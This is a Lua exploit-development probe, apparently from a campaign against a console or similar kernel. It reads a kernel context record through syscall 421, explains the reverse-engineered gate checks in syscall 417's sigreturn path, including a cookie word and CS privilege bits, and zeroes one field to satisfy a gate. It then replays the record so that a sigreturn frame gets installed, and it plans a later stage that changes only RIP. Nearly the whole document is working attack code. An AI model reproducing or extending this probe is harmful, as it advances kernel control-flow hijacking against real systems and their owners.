-- CRASH_CLASS: HIGH
-- PROBE 814b: feed the kernel's own context record back through sigreturn
--
-- Context: 814a showed syscall 421 returns a 0x4c0 record whose tail is the
-- sigreturn frame itself:
--   0x0E0 RIP, 0x0E8 CS=0x43, 0x0F0 RFLAGS=0x202, 0x0F8 RSP,
--   0x100 SS=0x3B, 0x108=0x480, 0x110=0x10002, 0x118=0x20001
-- 417's gates read (with the handler's rbx = user - 0xa0):
--   [rbx+0x170] = user 0x0D0 < 8
--   ([rbx+0x190] ^ [[td+0x460]+0xf8]) & 0xFFFFFFFFFFDAB22A == 0
--   [rbx+0x188] & 3 == 3      -> user 0x0E8 = CS = 0x43
--   [rbx+0x1b0] == 0x10000|0x10002 -> user 0x110
-- The cookie word is user 0x0F0 = RFLAGS = 0x202, which probe 813a sent as 0.
-- So: take the kernel's own record and hand it straight back.
-- Stage A dumps the fields, stage B sends the record unchanged. If B returns
-- normally the gate passed and the success path (0xC0 bytes into
-- [td+0x460]) ran. Stage C then changes only RIP, in a separate probe.

print("=== PROBE 814b: SIGRETURN ROUND-TRIP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function q(addr)
    local v = safe_rq(addr)
    if v == nil then return 0 end
    return to_num(v)
end

local sc421 = make_syscall(421)
local sc417 = make_syscall(417)

local page = memory.alloc(0x600)
for off = 0, 0x5FF, 4 do safe_wd(page + off, 0) end

print(string.format("[0] pid=%d buf=0x%08X", to_num(syscall.getpid()), to_num(page)))

local ok, r = pcall(function() return sc421(uint64(page)) end)
print(string.format("[A] 421 ret=%s ok=%s", tostring(r), tostring(ok)))
print(string.format("    D0=%016X (gate: <8)", q(page + 0xD0)))
print(string.format("    E0=%016X (RIP)",     q(page + 0xE0)))
print(string.format("    E8=%016X (CS, needs &3==3)", q(page + 0xE8)))
print(string.format("    F0=%016X (cookie RFLAGS)", q(page + 0xF0)))
print(string.format("    F8=%016X (RSP)",     q(page + 0xF8)))
print(string.format("    100=%016X (SS)",     q(page + 0x100)))
print(string.format("    110=%016X (needs 0x10000|0x10002)", q(page + 0x110)))
print(string.format("    118=%016X (needs 0x20001/0x20002)", q(page + 0x118)))

-- The only field 814a left as a candidate block: D0 is not < 8 in the record.
-- Reproduce exactly what the kernel returned, then report whether the D0 gate
-- would reject it before we send anything.
local d0 = q(page + 0xD0)
if d0 >= 8 then
    print("[A2] D0 is not < 8 in the kernel's own record -> zeroing D0 only")
    safe_wd(page + 0xD0, 0)
    safe_wd(page + 0xD4, 0)
end

print("")
print("[B] sending the record back through 417 ...")
local ok2, r2 = pcall(function() return sc417(uint64(page)) end)
print(string.format("[B] 417 ret=%s ok=%s", tostring(r2), tostring(ok2)))
print("[B] if this line printed, the gate passed and the frame was installed")

print("")
print("[C] still alive after sigreturn: pid=" .. tostring(syscall.getpid()))
print("")
print("=== PROBE 814b DONE ===")
